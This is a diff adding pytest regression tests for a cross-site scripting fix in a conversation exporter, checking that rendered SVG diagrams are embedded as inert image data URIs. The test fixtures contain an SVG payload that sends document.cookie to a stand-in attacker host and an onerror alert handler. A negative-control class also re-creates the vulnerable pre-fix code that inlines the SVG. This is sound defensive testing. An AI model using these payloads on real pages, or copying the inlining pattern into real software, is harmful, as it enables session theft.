@@ -146,3 +146,94 @@ class TestNegativeControlPreFixBehavior:
     def test_prefix_logic_renders_javascript_link_live(self):
         html = self._pre_fix_markdown_to_html_basic('[click me](javascript:alert%281%29)')
         assert 'href="javascript:alert%281%29"' in html  # proves the exploit fired pre-fix
+
+
+# ---------------------------------------------------------------------------
+# PenPal #116 [CWE-79]: rendered-SVG diagram embedding must not inline the SVG
+# ---------------------------------------------------------------------------
+import base64
+
+try:
+    from app.utils.conversation_exporter import (
+        _embed_diagrams_in_html,
+        _viz_fingerprint,
+    )
+    _HAS_EMBED = True
+except ImportError:  # helpers not present yet — skip rather than error-collect
+    _HAS_EMBED = False
+
+
+_MALICIOUS_SVG = (
+    b'<svg xmlns="http://www.w3.org/2000/svg">'
+    b'<script>fetch("https://attacker.example/?c="+document.cookie)</script>'
+    b'<image href="x" onerror="alert(document.cookie)"/>'
+    b'</svg>'
+)
+
+
+def _make_diagram_map(svg_bytes: bytes, viz_type: str = "mermaid",
+                      diagram_type: str = "svg"):
+    """Build the (content, diagram_by_hash) pair _embed_diagrams_in_html
+    consumes. NOTE: the function runs _markdown_to_html_basic(content) FIRST
+    (which HTML-escapes code-fence bodies since #51) and only then matches
+    the viz pattern + fingerprints group(2). So content must be a raw
+    markdown fence, and the fingerprint must key on the source EXACTLY as it
+    survives conversion. We use a special-char-free source so the pre- and
+    post-escape forms are identical and the fingerprint matches."""
+    source_code = "graph LR A B C"
+    fp = _viz_fingerprint(source_code)
+    data_uri = f"data:image/svg+xml;base64,{base64.b64encode(svg_bytes).decode()}"
+    content = f"```{viz_type}\n{source_code}\n```"
+    return content, {fp: {"dataUri": data_uri, "type": diagram_type,
+                          "width": 600, "height": 400}}
+
+
+@pytest.mark.skipif(not _HAS_EMBED, reason="_embed_diagrams_in_html not available")
+class TestRenderedSvgNotInlined:
+    """A rendered SVG (from a model-authored diagram spec) must never be
+    inlined into the exported DOM, where its <script>/on* handlers would
+    execute. It must be embedded via <img src=data:...>, which browsers
+    render script-inert."""
+
+    def test_malicious_svg_not_inlined_as_raw_markup(self):
+        content, dmap = _make_diagram_map(_MALICIOUS_SVG)
+        html = _embed_diagrams_in_html(content, dmap)
+        assert "<script>" not in html
+        assert 'onerror="alert' not in html
+        assert "attacker.example" not in html
+
+    def test_svg_embedded_via_img_data_uri(self):
+        content, dmap = _make_diagram_map(_MALICIOUS_SVG)
+        html = _embed_diagrams_in_html(content, dmap)
+        assert '<img src="data:image/svg+xml;base64,' in html
+
+    def test_benign_svg_still_rendered_via_img(self):
+        benign = (b'<svg xmlns="http://www.w3.org/2000/svg">'
+                  b'<rect width="10" height="10"/></svg>')
+        content, dmap = _make_diagram_map(benign)
+        html = _embed_diagrams_in_html(content, dmap)
+        assert '<img src="data:image/svg+xml;base64,' in html
+        assert '<code class="language-mermaid">' not in html
+
+
+class TestNegativeControlInlineSvgPreFix:
+    """Negative control: the pre-fix inline-SVG branch emitted the decoded
+    SVG verbatim into the DOM, so a <script> in it WOULD reach the exported
+    document. Proves the tests above are non-vacuous."""
+
+    @staticmethod
+    def _pre_fix_embed(data_uri: str, diagram_type: str) -> str:
+        if diagram_type == "svg" and "," in data_uri:
+            try:
+                svg_content = base64.b64decode(data_uri.split(",")[1]).decode("utf-8")
+                return f'<div class="visualization">{svg_content}</div>'
+            except Exception:
+                pass
+        return f'<div class="visualization"><img src="{data_uri}"/></div>'
+
+    def test_pre_fix_inlines_executable_svg(self):
+        data_uri = ("data:image/svg+xml;base64,"
+                    + base64.b64encode(_MALICIOUS_SVG).decode())
+        html = self._pre_fix_embed(data_uri, "svg")
+        assert "<script>" in html
+        assert "attacker.example" in html
